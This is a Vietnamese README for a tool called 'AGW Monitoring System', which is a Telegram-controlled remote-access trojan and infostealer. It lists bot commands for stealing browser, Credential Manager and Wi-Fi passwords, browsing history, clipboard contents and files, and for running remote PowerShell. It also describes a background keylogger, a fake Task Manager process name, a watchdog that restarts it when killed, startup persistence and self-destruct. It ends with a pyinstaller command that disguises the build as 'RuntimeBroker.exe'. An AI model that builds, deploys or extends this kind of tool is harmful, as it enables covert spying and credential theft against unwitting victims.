# AGW Monitoring System

Hệ thống giám sát từ xa, điều khiển qua Telegram Bot.

---

## Cấu hình (CONFIG trong final.py)

| Key | Mô tả |
|---|---|
| `discord_webhook` | URL webhook Discord |
| `telegram_token` | Token bot Telegram |
| `telegram_allowed_ids` | Danh sách chat_id được phép điều khiển |
| `monitored_apps` | Danh sách exe keylogger theo dõi |
| `fake_name` | Tên tiến trình giả trong Task Manager |
| `control_port` | Port HTTP server LAN (mặc định 6789) |
| `relay_url` | URL relay server (để trống nếu dùng LAN) |

---

## Lệnh Telegram

### Điều khiển
| Lệnh | Chức năng |
|---|---|
| `/status` | Trạng thái máy (OS, screenshot mode, thời gian) |
| `/screenshot` | Chụp màn hình ngay, gửi về Telegram + Discord |
| `/screenshot_start` | Chụp màn hình mỗi 30 giây |
| `/screenshot_stop` | Dừng chụp liên tục |
| `/lock` | Khóa màn hình Windows |
| `/shutdown` | Tắt chương trình trên máy đích |

### Thu thập dữ liệu
| Lệnh | Chức năng |
|---|---|
| `/passwords` | Lấy mật khẩu Chrome/Edge/Brave (chỉ v10) |
| `/credman` | Lấy mật khẩu Windows Credential Manager |
| `/wifi` | Lấy mật khẩu WiFi đã lưu |
| `/history` | Lấy lịch sử duyệt web (Chrome/Edge/Brave/Firefox) |
| `/clipboard` | Xem nội dung clipboard hiện tại |
| `/download <path>` | Gửi file từ máy đích về Telegram (tối đa 50MB) |

### Điều khiển từ xa
| Lệnh | Chức năng |
|---|---|
| `/shell <lệnh>` | Chạy lệnh PowerShell, trả kết quả về Telegram |
| `/type <text>` | Gõ text vào máy đích (hỗ trợ tiếng Việt) |
| `/open <path/url>` | Mở file hoặc URL trên máy đích |

### Nguy hiểm
| Lệnh | Chức năng |
|---|---|
| `/selfdestruct` | Xem cảnh báo trước khi tự hủy |
| `/selfdestruct confirm` | Xóa registry, log, file cài đặt rồi tắt |

---

## Tính năng tự động (chạy nền)

| Tính năng | Mô tả |
|---|---|
| **Keylogger** | Theo dõi phím gõ trong `chrome.exe`, `msedge.exe`, `zalo.exe` |
| **Clipboard monitor** | Gửi về mỗi khi clipboard thay đổi |
| **File tracker** | Theo dõi file tạo/sửa/xóa ở Desktop, Documents, Downloads |
| **Watchdog** | Tự động khởi động lại nếu bị kill |
| **Heartbeat** | Gửi thông báo định kỳ để xác nhận còn hoạt động |

---

## Cài đặt & Đóng gói

### Cài dependencies
```bash
pip install psutil pynput pycryptodome cryptography mss pillow pywin32 requests
```

### Chạy thử (không cài đặt)
```bash
python final.py
```

### Chạy có cài đặt + ẩn (bỏ comment 3 dòng trong main())
```python
installed_path = install_self()   # copy vào AppData
add_to_startup(installed_path)    # thêm registry startup
hide_console()                    # ẩn cửa sổ
```

### Đóng gói exe
```bash
pyinstaller --onefile --noconsole --name RuntimeBroker \
  --hidden-import=psutil --hidden-import=win32gui \
  --hidden-import=win32process --hidden-import=win32clipboard \
  --hidden-import=win32con --hidden-import=win32crypt \
  --hidden-import=pynput --hidden-import=pynput.keyboard._win32 \
  --hidden-import=mss --hidden-import=Crypto.Cipher.AES \
  --hidden-import=cryptography.fernet final.py
```
File exe xuất ra tại `dist\RuntimeBroker.exe`

---

## Giới hạn

- Mật khẩu Chrome/Edge **v20** (Chrome 127+) không giải mã được
- File gửi về Telegram tối đa **50 MB**
- Lệnh `/shell` timeout sau **30 giây**
